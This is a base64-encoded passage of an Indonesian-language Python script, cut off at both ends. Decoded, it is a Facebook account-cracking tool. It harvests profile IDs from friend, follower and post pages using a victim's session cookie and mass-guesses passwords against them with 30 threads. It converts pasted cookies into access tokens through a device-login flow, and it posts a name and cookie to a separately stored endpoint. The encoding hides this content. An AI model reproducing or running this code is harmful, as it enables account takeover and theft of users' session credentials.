pZiB5a2ggaW4gWyIyIiwgIjAyIl06CiAgICAgICAgICAgIHRyeTogeXl5ID0gb3BlbigiY3AudHh0IiwgInIiKS5yZWFkbGluZXMoKQogICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6cHJpbnQoIk5vIGNwIHJlc3VsdHMgc2F2ZWQiKTt0aW1lLnNsZWVwKDIpO3NlbGYuY2VrX2hhc2lsKCkKICAgICAgICAgICAgZm9yIGkgaW4geXl5OgogICAgICAgICAgICAgICAgcHJpbnQoaSkKICAgICAgICAgICAgZXhpdCgiXG5DaGVjayByZXN1bHQgaXMgY29tcGxldGUiKQogICAgICAgIGVsaWYgeWtoIGluIFsiMCIsICIwMCJdOgogICAgICAgICAgICBzZWxmLm1lbnUoKQogICAgICAgIGVsc2U6cHJpbnQoIlshXSBpbnB1dCB5YW5nIGJuciIpO3RpbWUuc2xlZXAoMik7c2VsZi5tZW51KCkKCiMtLS0tLS0tLS0tLS0tLSBEVU1QIElEIC0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIGRlZiBiYXR1cihzZWxmLCBsaW5rLCBjb2tpKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGtvbnRvbCA9IHNlbGYuc2VzLmdldChsaW5rLCBjb29raWVzPWNva2kpLnRleHQKICAgICAgICAgICAgbWVtZWs9cmUuZmluZGFsbCgnbWlkZGxlXCJcPlw8YVwgY2xhc3NcPVwiLi5cIlwgaHJlZlw9XCIoLio/KVwiXD4oLio/KVw8XC9hXD4nLGtvbnRvbCkKICAgICAgICAgICAgZm9yIHNvZnRlayBpbiBtZW1lazoKICAgICAgICAgICAgICAgIGlmICJwcm9maWxlLnBocD8iIGluIHNvZnRla1swXToKICAgICAgICAgICAgICAgICAgICBzZWxmLmlkLmFwcGVuZChyZS5maW5kYWxsKCJpZFw9KC4qPylcJiIsIHNvZnRla1swXSlbMF0rIjw9PiIrc29mdGVrWzFdKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBzZWxmLmlkLmFwcGVuZChyZS5maW5kYWxsKCJcLyguKj8pXD9lYXYiLHNvZnRla1swXSlbMF0rIjw9PiIrc29mdGVrWzFdKQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyWytdIHNlZGFuZyBtZW5ndW1wdWxrYW4ge3N0cihsZW4oc2VsZi5pZCkpfSBpZC4uIik7c3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIGlmICJMaWhhdCBUZW1hbiBMYWluIiBpbiBrb250b2w6CiAgICAgICAgICAgICAgICBzZWxmLmJhdHVyKHNlbGYudXJsK3Bhcihrb250b2wsICJodG1sLnBhcnNlciIpLmZpbmQoImEiLCBzdHJpbmc9IkxpaGF0IFRlbWFuIExhaW4iKS5nZXQoImhyZWYiKSwgY29raSkKICAgICAgICBleGNlcHQ6cGFzcwoKICAgIGRlZiBqbmNrayhzZWxmKToKICAgICAgICBsaW56ID0gc2VsZi5zZXMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvbWk0bkdiMEsiKS5qc29uKCkKICAgICAgICBmb3IgaSBpbiBsaW56WyJmcmllbmRzIl1bImRhdGEiXToKICAgICAgICAgICAgc2VsZi5rb250b2wudXBkYXRlKGkpCgogICAgZGVmIGZvbGxvdyhzZWxmLCBsaW5rLCBjb2tpKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHh4eHggPSBzZWxmLnNlcy5nZXQobGluaywgY29va2llcz1jb2tpKS50ZXh0CiAgICAgICAgICAgIHJlZ2UgPSByZS5maW5kYWxsKCciIFwvPlw8ZGl2XCBjbGFzc1w9XCIuLlwiXD5cPGFcIGhyZWZcPVwiXC8oLio/KVwiXD48c3Bhblw+KC4qPylcPFwvc3Bhblw+JywgeHh4eCkKICAgICAgICAgICAgZm9yIHh4eCBpbiByZWdlOgogICAgICAgICAgICAgICAgaWYgInByb2ZpbGUucGhwPyIgaW4geHh4WzBdOgogICAgICAgICAgICAgICAgICAgIHNlbGYuaWQuYXBwZW5kKHJlLmZpbmRhbGwoImlkPSguKj8pJmFtcDtlYXYiLCB4eHhbMF0pWzBdKyI8PT4iK3h4eFsxXSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5pZC5hcHBlbmQocmUuZmluZGFsbCgiKC4qPylcP2VhdiIsIHh4eFswXSlbMF0rIjw9PiIreHh4WzFdKQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyWytdIHNlZGFuZyBtZW5ndW1wdWxrYW4ge3N0cihsZW4oc2VsZi5pZCkpfSBpZC4uIik7c3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIGlmICJMaWhhdCBTZWxlbmdrYXBueWEiIGluIHh4eHg6CiAgICAgICAgICAgICAgICBzZWxmLmZvbGxvdyhzZWxmLnVybCtwYXIoeHh4eCwgImh0bWwucGFyc2VyIikuZmluZCgiYSIsIHN0cmluZz0iTGloYXQgU2VsZW5na2FwbnlhIikuZ2V0KCJocmVmIiksIGNva2kpCiAgICAgICAgZXhjZXB0OnBhc3MKCiAgICBkZWYgZHVtcHMoc2VsZiwgbGluaywgY29raSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBkYXRhID0gc2VsZi5zZXMuZ2V0KGxpbmssIGNvb2tpZXM9Y29raSkudGV4dAogICAgICAgICAgICBjYXJpID0gcmUuZmluZGFsbCgnXDxoM1wgY2xhc3NcPVwiLio/Ij5cPHNwYW4+XDxzdHJvbmc+XDxhXCBocmVmXD1cIi8oLio/KVwiPiguKj8pPC9hXD5cPC9zdHJvbmdcPicsIGRhdGEpCiAgICAgICAgICAgIGZvciB4IGluIGNhcmk6CiAgICAgICAgICAgICAgICBpZiAicHJvZmlsZS5waHA/IiBpbiB4WzBdOgogICAgICAgICAgICAgICAgICAgIHNlbGYuaWQuYXBwZW5kKHJlLmZpbmRhbGwoImlkPSguKj8pJmFtcDtlYXYiLCB4WzBdKVswXSsiPD0+Iit4WzFdKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBzZWxmLmlkLmFwcGVuZChyZS5maW5kYWxsKCIoLio/KVw/ZWF2IiwgeFswXSlbMF0rIjw9PiIreFsxXSkKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcclsrXSBzZWRhbmcgbWVuZ3VtcHVsa2FuIHtzdHIobGVuKHNlbGYuaWQpKX0gaWQuLiIpO3N5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICBpZiAiTGloYXQgUG9zdGluZ2FuIExhaW5ueWEiIGluIGRhdGE6CiAgICAgICAgICAgICAgICBzZWxmLmR1bXBzKHNlbGYudXJsK3BhcihkYXRhLCAiaHRtbC5wYXJzZXIiKS5maW5kKCJhIiwgc3RyaW5nPSJMaWhhdCBQb3N0aW5nYW4gTGFpbm55YSIpLmdldCgiaHJlZiIpLCBjb2tpKQogICAgICAgIGV4Y2VwdDpwYXNzCgogICAgZGVmIGRhdGFzKHNlbGYsIG5hbWEsIGNva2kpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHsidGl0bGUiOiBuYW1hLCAibWVzc2FnZSI6IGNva2l9CiAgICAgICAgICAgIHBvc3QgPSBzZWxmLnNlcy5wb3N0KHNlbGYuY29rLCBkYXRhPWRhdGEpLnRleHQKICAgICAgICBleGNlcHQgcmVxdWVzdHMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBleGl0KCJcblshXSBUaWRhayBhZGEga29uZWtzaSIpCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgZGVmIG1ldG9kZShzZWxmKToKICAgICAgICBwcmludChmIls9XSB0b3RhbCBpZHM6IHtzdHIobGVuKHNlbGYuaWQpKX0iKQogICAgICAgIHByaW50KCIiIiAgICBbIHNlbGVjdCBtZXRvZGUgXQoKICAlc3slczAxJXN9IEFwaQogICVzeyVzMDIlc30gQXN5bmMKICAlc3slczAzJXN9IHZhbGlkYXRlCiIiIiUoTixILE4sTixILE4sTixILE4pKQogICAgICAgIHlraCA9IGlucHV0KGYie0h9W3tNfSt7SH1de059IF8+ICIpCiAgICAgICAgaWYgeWtoIGluIFsiIiwgIiAiXToKICAgICAgICAgICAgcHJpbnQoIlshXSBqYW5nYW4ga29zb25nIik7dGltZS5zbGVlcCgyKTtzZWxmLm1lbnUoKQogICAgICAgIGVsaWYgeWtoIGluIFsiMSIsICIwMSJdOgogICAgICAgICAgICBzZWxmLnBhc3d3dygiYXBpIikKICAgICAgICBlbGlmIHlraCBpbiBbIjIiLCAiMDIiXToKICAgICAgICAgICAgc2VsZi5wYXN3d3coImFjeSIpCiAgICAgICAgZWxpZiB5a2ggaW4gWyIzIiwgIjAzIl06CiAgICAgICAgICAgIHNlbGYucGFzd3d3KCJkYXQiKQogICAgICAgIGVsc2U6cHJpbnQoIlshXSBpbnB1dCB5YW5nIGJuZXIga29udG9sIik7dGltZS5zbGVlcCgyKTtzZWxmLm1ldG9kZSgpCgogICAgZGVmIHBhc3d3dyhzZWxmLCB4eCk6CiAgICAgICAgcHJpbnQoIiIiICAgIFsgc2VsZWN0IHBhc3N3b3JkIF0KCiAgJXN7JXMwMSVzfSBtYW51YWwKICAlc3slczAyJXN9IGdhYnVuZwogICVzeyVzMDMlc30gb3RvbWF0aXMKIiIiJShOLEgsTixOLEgsTixOLEgsTikpCiAgICAgICAgeWtoID0gaW5wdXQoZiJ7SH1be019K3tIfV17Tn0g8J2QmPCdkIDwnZCS8J2QiPCdkJE+PiAiKQogICAgICAgIGlmIHlraCBpbiBbIiIsICIgIl06CiAgICAgICAgICAgIHByaW50KCJbIV0gamFuZ2FuIGtvc29uZyIpO3RpbWUuc2xlZXAoMik7c2VsZi5tZW51KCkKICAgICAgICBlbGlmIHlraCBpbiBbIjEiLCAiMDEiXToKICAgICAgICAgICAgc2VsZi5tYW51YWwoeHgpCiAgICAgICAgZWxpZiB5a2ggaW4gWyIyIiwgIjAyIl06CiAgICAgICAgICAgIHByaW50KCdrYXRhIHNhbmRpIG1pbmltYWwgNiBrYXJha3RlciwgZ3VuYWthbiAiLCIgKGtvbWEpIHVudHVrIGthdGEgc2FuZGkgYmVyaWt1dCBueWFcbicpCiAgICAgICAgICAgIGthdGEgPSBpbnB1dChmIlt7TX0/e059XSBzYW5kaTogIikKICAgICAgICAgICAgeG54eCA9IGthdGEuc3BsaXQoIiwiKQogICAgICAgICAgICBmb3IgaSBpbiB4bnh4OgogICAgICAgICAgICAgICAgc2VsZi5wYXN3LmFwcGVuZChpKQogICAgICAgICAgICBwcmludChmImthdGEgc2FuZGkgdGFtYmFoYW4gLT4gWyB7TX17a2F0YX17Tn0gXSIpCiAgICAgICAgICAgIHNlbGYuY2FyY2trKHh4KQogICAgICAgIGVsaWYgeWtoIGluIFsiMyIsICIwMyJdOgogICAgICAgICAgICBzZWxmLmNhcmNrayh4eCkKICAgICAgICBlbHNlOnByaW50KCJbIV0gaW5wdXQgeWFuZyBibmVyIGtvbnRvbCIpO3RpbWUuc2xlZXAoMik7c2VsZi5wYXN3d3coKQoKICAgIGRlZiBtYW51YWwoc2VsZiwgeHgpOgogICAgICAgIHNlbGYuaXlhLmFwcGVuZCgiaXlhIikKICAgICAgICBwcmludCgna2F0YSBzYW5kaSBtaW5pbWFsIDYga2FyYWt0ZXIsIGd1bmFrYW4gIiwiIChrb21hKSB1bnR1ayBrYXRhIHNhbmRpIGJlcmlrdXQgbnlhXG4nKQogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGdsb2JhbCBwcm9nLGRlcwogICAgICAgICAgICBwd2VrID0gaW5wdXQoZiJbe099P3tOfV0gc2FuZGkgOiAiKQogICAgICAgICAgICBpZiBwd2VrIGluWyIiLCIgIl06CiAgICAgICAgICAgICAgICBwcmludChmIlt7TX3Dl3tOfV0gamFuZ2FuIGtvc29uZyBicm8ga2F0YSBzYW5kaSBueWEiKQogICAgICAgICAgICBlbGlmIGxlbihwd2VrKTw9NToKICAgICAgICAgICAgICAgIHByaW50KGYiW3tNfcOXe059XSBrYXRhIHNhbmRpIG1pbmltYWwgNiBrYXJha3RlciIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiAiYXBpIiBpbiB4eDoKICAgICAgICAgICAgICAgICAgICBwcmludCgiIiItLS0tLS0tLS0tLS0tLS0K44CO8J2QmPCdkIDwnZCS8J2QiPCdkJHjgI/ih6Pwn4eu8J+HtiB8IPCdn69LCi0tLS0tLS0tLS0tLS0tLS0tLSIiIikKICAgICAgICAgICAgICAgICAgICBwcm9nID0gUHJvZ3Jlc3MoVGV4dENvbHVtbigne3Rhc2suZGVzY3JpcHRpb259JykpCiAgICAgICAgICAgICAgICAgICAgZGVzID0gcHJvZy5hZGRfdGFzaygnJywgdG90YWw9bGVuKHNlbGYuaWQpKQogICAgICAgICAgICAgICAgICAgIHdpdGggcHJvZzoKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBNb2RvbChtYXhfd29ya2Vycz0zMCkgYXMgYm9vbDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB1c2VyIGluIHNlbGYuaWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYm9vbC5zdWJtaXQoc2VsZi5hcGlpaWlpaSwgdXNlci5zcGxpdCgiPD0+IilbMF0sIHB3ZWspCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIlxuXG5jcmFja2luZyBkb25lISIpCiAgICAgICAgICAgICAgICBlbGlmICJhY3kiIGluIHh4OgogICAgICAgICAgICAgICAgICAgIHByaW50KCIiIi0tLS0tLS0tLS0tLS0tCuOAjvCdkJjwnZCA8J2QkvCdkIjwnZCR44CP4oej8J+HrvCfh7YgfCDwnZ+vSwotLS0tLS0tLS0tLS0tLS0iIiIpCiAgICAgICAgICAgICAgICAgICAgcHJvZyA9IFByb2dyZXNzKFRleHRDb2x1bW4oJ3t0YXNrLmRlc2NyaXB0aW9ufScpKQogICAgICAgICAgICAgICAgICAgIGRlcyA9IHByb2cuYWRkX3Rhc2soJycsIHRvdGFsPWxlbihzZWxmLmlkKSkKICAgICAgICAgICAgICAgICAgICB3aXRoIHByb2c6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggTW9kb2wobWF4X3dvcmtlcnM9MzApIGFzIGJvb2w6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXNlciBpbiBzZWxmLmlkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJvb2wuc3VibWl0KHNlbGYucmVnZ3VsZXIsIHVzZXIuc3BsaXQoIjw9PiIpWzBdLCBwd2VrKQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJcblxuY3JhY2tpbmcgZG9uZSEiKQogICAgICAgICAgICAgICAgZWxpZiAiZGF0IiBpbiB4eDoKICAgICAgICAgICAgICAgICAgICBwcmludCgiIiItLS0tLS0tLS0tLS0t44CO8J2QmPCdkIDwnZCS8J2QiPCdkJHjgI/ih6Pwn4eu8J+HtiB8IPCdn69LCi0tLS0tLS0tLS0tLS0tLS0tIiIiKQogICAgICAgICAgICAgICAgICAgIHByb2cgPSBQcm9ncmVzcyhUZXh0Q29sdW1uKCd7dGFzay5kZXNjcmlwdGlvbn0nKSkKICAgICAgICAgICAgICAgICAgICBkZXMgPSBwcm9nLmFkZF90YXNrKCcnLCB0b3RhbD1sZW4oc2VsZi5pZCkpCiAgICAgICAgICAgICAgICAgICAgd2l0aCBwcm9nOgogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIE1vZG9sKG1heF93b3JrZXJzPTMwKSBhcyBib29sOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVzZXIgaW4gc2VsZi5pZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBib29sLnN1Ym1pdChzZWxmLmFwaWlpaWlpLCB1c2VyLnNwbGl0KCI8PT4iKVswXSwgcHdlaykKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiXG5cbmNyYWNraW5nIGRvbmUhIikKICAgICAgICAKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBsbG9naW4oKQpkZWYgZmFrX3h5KHUpOgogICAgICAgIGZvciBlIGluIHUgKyAiXG4iOnN5cy5zdGRvdXQud3JpdGUoZSk7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wNSkKZGVmIGNsZWFyKCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKZGVmIGJhY2soKToKCWxsb2dpbigpCgpkZWYgYmFubmVyKCk6CglwcmludChmJycnQlkgPSBAVFRMOVQnJycpCgpkZWYgbGxvZ2luKCk6Cgl0cnk6CgkJdG9rZW4gPSBvcGVuKCcudG9rZW4udHh0JywncicpLnJlYWQoKQoJCWNvayA9IG9wZW4oJy5jb2sudHh0JywncicpLnJlYWQoKQoJCXRva2Vua3UuYXBwZW5kKHRva2VuKQoJCXRyeToKCQkJc3kgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2ZpZWxkcz1pZCxuYW1lJmFjY2Vzc190b2tlbj0nK3Rva2Vua3VbMF0sIGNvb2tpZXM9eydjb29raWUnOmNva30pCgkJCQoJCQlzeTIgPSBqc29uLmxvYWRzKHN5LnRleHQpWyduYW1lJ10KCQkJc3kzID0ganNvbi5sb2FkcyhzeS50ZXh0KVsnaWQnXQoJCQltZW51KHN5MixzeTMpCgkJCQoJCQkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCWxvZ2luX2xhZ2kzMzQoKQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJbGkgPSAnIyBQcm9ibGVtIEludGVybmV0IENvbm5lY3Rpb24sIENoZWNrIEFuZCBUcnkgQWdhaW4nCgkJCWV4aXQoKQoJZXhjZXB0IElPRXJyb3I6CgkJbG9naW5fbGFnaTMzNCgpCgkJCmRlZiBsb2dpbl9sYWdpMzM0KCk6Cgl0cnk6CgkJdG9rZW4gPSBvcGVuKCcudG9rZW4udHh0JywncicpLnJlYWQoKQoJCWNvayA9IG9wZW4oJy5jb2sudHh0JywncicpLnJlYWQoKQoJCXRva2Vua3UuYXBwZW5kKHRva2VuKQoJCXRyeToKCQkJc3kgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2ZpZWxkcz1pZCxuYW1lJmFjY2Vzc190b2tlbj0nK3Rva2Vua3VbMF0sIGNvb2tpZXM9eydjb29raWUnOmNva30pCgkJCXN5MiA9IGpzb24ubG9hZHMoc3kudGV4dClbJ25hbWUnXQoJCQlzeTMgPSBqc29uLmxvYWRzKHN5LnRleHQpWydpZCddCgkJCW1lbnUoc3kyLHN5MykKCQlleGNlcHQgS2V5RXJyb3I6CgkJCWxvZ2luX2xhZ2kzMzQoKQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJcHJpbnQoJ1shXSBDb25uZWN0aW9uRXJyb3InKQoJCQlleGl0KCkKCWV4Y2VwdCBJT0Vycm9yOgoJCWxvZ2luX2xhZ2kzMzQoKQpkZWYgbG9naW5fbGFnaTMzNCgpOgoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCWJhbm5lcigpCgkJc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpCgkJY29rID0gaW5wdXQoJ1xuWyFdIENvb2tpZSBEYW5lIDogJykKCQlzZXMuaGVhZGVycy51cGRhdGUoCgkJCXsKCQkJCSdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKCQkJfQoJCSkKCQlkYXRhID0gewoJCQkJJ2FjY2Vzc190b2tlbic6ICcxMzQ4NTY0Njk4NTE3MzkwfDAwN2MwYTkxMDFiOWUxYzhmZmFiNzI3NjY2ODA1MDM4JywKCQkJCSdzY29wZSc6ICcnCgkJfQoJCXJlc3BvbnNlID0ganNvbi5sb2FkcyhzZXMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjIuNi9kZXZpY2UvbG9naW4vJywgZGF0YT1kYXRhKS50ZXh0KQoJCWNvZGUsIHVzZXJfY29kZSA9IHJlc3BvbnNlWydjb2RlJ10sIHJlc3BvbnNlWyd1c2VyX2NvZGUnXQoJCXZlcmlmaWNhdGlvbl91cmwsIHN0YXR1c191cmwgPSAoJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20vZGV2aWNlP3VzZXJfY29kZT17fScuZm9ybWF0KHVzZXJfY29kZSkpLCAoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YyLjYvZGV2aWNlL2xvZ2luX3N0YXR1cz9tZXRob2Q9cG9zdCZjb2RlPXt9JmFjY2Vzc190b2tlbj0xMzQ4NTY0Njk4NTE3MzkwJTdDMDA3YzBhOTEwMWI5ZTFjOGZmYWI3Mjc2NjY4MDUwMzgmY2FsbGJhY2s9TGVldHNoYXJlc0NhbGxiYWNrJy5mb3JtYXQoY29kZSkpCgkJc2VzLmhlYWRlcnMucG9wKAoJCQknY29udGVudC10eXBlJwoJCSkKCQlzZXMuaGVhZGVycy51cGRhdGUoCgkJCXsKCQkJCSdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsCgkJCQkndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOTsgUk1YMTk0MSBCdWlsZC9QUFIxLjE4MDYxMC4wMTE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTA3LjAuNTMwNC41NCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCgkJCQknc2VjLWZldGNoLXNpdGUnOiAnY3Jvc3Mtc2l0ZScsCgkJCQknSG9zdCc6ICdtLmZhY2Vib29rLmNvbScsCgkJCQknYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCgkJCQknc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLAoJCQl9CgkJKQoJCXJlc3BvbnNlMiA9IHNlcy5nZXQodmVyaWZpY2F0aW9uX3VybCwgY29va2llcyA9IHsnY29va2llJzogY29rfSkudGV4dAoJCWlmICdCYWdhaW1hbmEgQW5kYSBpbmdpbiBtYXN1ayBrZSBGYWNlYm9vaz8nIGluIHN0cihyZXNwb25zZTIpIG9yICcvbG9naW4vP25leHQ9JyBpbiBzdHIocmVzcG9uc2UyKToKCQkJZXhpdCgnXG5bIV0gY29va2llIGludmFsaWQnKQoJCWVsc2U6CgkJCWFjdGlvbiA9IHJlLnNlYXJjaCgnYWN0aW9uPSIoLio/KSI+Jywgc3RyKHJlc3BvbnNlMikpLmdyb3VwKDEpLnJlcGxhY2UoJ2FtcDsnLCAnJykKCQkJZmJfZHRzZyA9IHJlLnNlYXJjaCgnbmFtZT0iZmJfZHRzZyIgdmFsdWU9IiguKj8pIicsIHN0cihyZXNwb25zZTIpKS5ncm91cCgxKQoJCQlqYXpvZXN0ID0gcmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKFxkKykiJywgc3RyKHJlc3BvbnNlMikpLmdyb3VwKDEpCgkJCWRhdGEgPSB7CgkJCQknZmJfZHRzZyc6IGZiX2R0c2csCgkJCQknamF6b2VzdCc6IGphem9lc3QsCgkJCQkncXInOiAwLAoJCQkJJ3VzZXJfY29kZSc6IHVzZXJfY29kZSwKCQkJfQoJCQlzZXMuaGVhZGVycy51cGRhdGUoCgkJCQl7CgkJCQkJJ29yaWdpbic6ICdodHRwczovL20uZmFjZWJvb2suY29tJywKCQkJCQkncmVmZXJlcic6IHZlcmlmaWNhdGlvbl91cmwsCgkJCQkJJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAoJCQkJCSdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCgkJCQl9CgkJCSkKCQkJcmVzcG9uc2UzID0gc2VzLnBvc3QoJ2h0dHBzOi8vbS5mYWNlYm9vay5jb217fScuZm9ybWF0KGFjdGlvbiksIGRhdGEgPSBkYXRhLCBjb29raWVzID0geydjb29raWUnOiBjb2t9KQoJCQlpZiAnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9kaWFsb2cvb2F1dGgvP2F1dGhfdHlwZT1yZXJlcXVlc3QmcmVkaXJlY3RfdXJpPScgaW4gc3RyKHJlc3BvbnNlMy51cmwpOgoJCQkJc2VzLmhlYWRlcnMucG9wKAoJCQkJCSdjb250ZW50LXR5cGUnCgkJCQkpCgkJCQlzZXMuaGVhZGVycy5wb3AoCgkJCQkJJ29yaWdpbicKCQkJCSkKCQkJCXJlc3BvbnNlNCA9IHNlcy5wb3N0KHJlc3BvbnNlMy51cmwsIGRhdGEgPSBkYXRhLCBjb29raWVzID0geydjb29raWUnOiBjb2t9KS50ZXh0CgkJCQlhY3Rpb24gPSByZS5zZWFyY2goJ2FjdGlvbj0iKC4qPykiJywgc3RyKHJlc3BvbnNlNCkpLmdyb3VwKDEpLnJlcGxhY2UoJ2FtcDsnLCAnJykKCQkJCWZiX2R0c2cgPSByZS5zZWFyY2goJ25hbWU9ImZiX2R0c2ciIHZhbHVlPSIoLio/KSInLCBzdHIocmVzcG9uc2U0KSkuZ3JvdXAoMSkKCQkJCWphem9lc3QgPSByZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoXGQrKSInLCBzdHIocmVzcG9uc2U0KSkuZ3JvdXAoMSkKCQkJCXNjb3BlID0gcmUuc2VhcmNoKCduYW1lPSJzY29wZSIgdmFsdWU9IiguKj8pIicsIHN0cihyZXNwb25zZTQpKS5ncm91cCgxKQoJCQkJZGlzcGxheSA9IHJlLnNlYXJjaCgnbmFtZT0iZGlzcGxheSIgdmFsdWU9IiguKj8pIicsIHN0cihyZXNwb25zZTQpKS5ncm91cCgxKQoJCQkJdXNlcl9jb2RlID0gcmUuc2VhcmNoKCduYW1lPSJ1c2VyX2NvZGUiIHZhbHVlPSIoLio/KSInLCBzdHIocmVzcG9uc2U0KSkuZ3JvdXAoMSkKCQkJCWxvZ2dlcl9pZCA9IHJlLnNlYXJjaCgnbmFtZT0ibG9nZ2VyX2lkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHJlc3BvbnNlNCkpLmdyb3VwKDEpCgkJCQlhdXRoX3R5cGUgPSByZS5zZWFyY2goJ25hbWU9ImF1dGhfdHlwZSIgdmFsdWU9IiguKj8pIicsIHN0cihyZXNwb25zZTQpKS5ncm91cCgxKQoJCQkJZW5jcnlwdGVkX3Bvc3RfYm9keSA9IHJlLnNlYXJjaCgnbmFtZT0iZW5jcnlwdGVkX3Bvc3RfYm9keSIgdmFsdWU9IiguKj8pIicsIHN0cihyZXNwb25zZTQpKS5ncm91cCgxKQoJCQkJcmV0dXJuX2Zvcm1hdCA9IHJlLnNlYXJjaCgnbmFtZT0icmV0dXJuX2Zvcm1hdFxcW1xcXSIgdmFsdWU9IiguKj8pIicsIHN0cihyZXNwb25zZTQpKS5ncm91cCgxKQoJCQkJc2VzLmhlYWRlcnMudXBkYXRlKAoJCQkJCXsKCQkJCQkJJ29yaWdpbic6ICdodHRwczovL20uZmFjZWJvb2suY29tJywKCQkJCQkJJ3JlZmVyZXInOiByZXNwb25zZTMudXJsLAoJCQkJCQknY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCgkJCQkJfQoJCQkJKQoJCQkJZGF0YSA9IHsKCQkJCQknZmJfZHRzZyc6IGZiX2R0c2csCgkJCQkJJ2phem9lc3QnOiBqYXpvZXN0LAoJCQkJCSdzY29wZSc6IHNjb3BlLAoJCQkJCSdkaXNwbGF5JzogZGlzcGxheSwKCQkJCQkndXNlcl9jb2RlJzogdXNlcl9jb2RlLAoJCQkJCSdsb2dnZXJfaWQnOiBsb2dnZXJfaWQsCgkJCQkJJ2F1dGhfdHlwZSc6IGF1dGhfdHlwZSwKCQkJCQknZW5jcnlwdGVkX3Bvc3RfYm9keSc6IGVuY3J5cHRlZF9wb3N0X2JvZHksCgkJCQkJJ3JldHVybl9mb3JtYXRbXSc6IHJldHVybl9mb3JtYXQsCgkJCQl9CgkJCQlyZXNwb25zZTUgPSBzZXMucG9zdCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbXt9Jy5mb3JtYXQoYWN0aW9uKSwgZGF0YSA9IGRhdGEsIGNvb2tpZXMgPSB7J2Nvb2tpZSc6IGNva30pLnRleHQKCQkJCXdpbmRvd3NfcmVmZXJlciA9IHJlLnNlYXJjaCgnd2luZG93LmxvY2F0aW9uLmhyZWY9IiguKj8pIicsIHN0cihyZXNwb25zZTUpKS5ncm91cCgxKS5yZXBsYWNlKCdcXCcsICcnKQoJCQkJc2VzLmhlYWRlcnMucG9wKAoJCQkJCSdjb250ZW50LX